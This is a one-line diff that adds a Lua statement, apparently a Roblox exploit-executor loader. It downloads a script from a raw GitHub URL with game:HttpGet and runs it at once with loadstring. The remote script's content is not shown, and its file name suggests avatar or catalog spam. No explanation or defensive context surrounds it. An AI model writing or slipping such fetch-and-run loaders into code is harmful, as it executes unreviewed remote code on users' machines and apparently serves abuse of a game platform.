@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/catalog-avatar-runway-spam3-2ivzg9q2o93huu.lua"))()
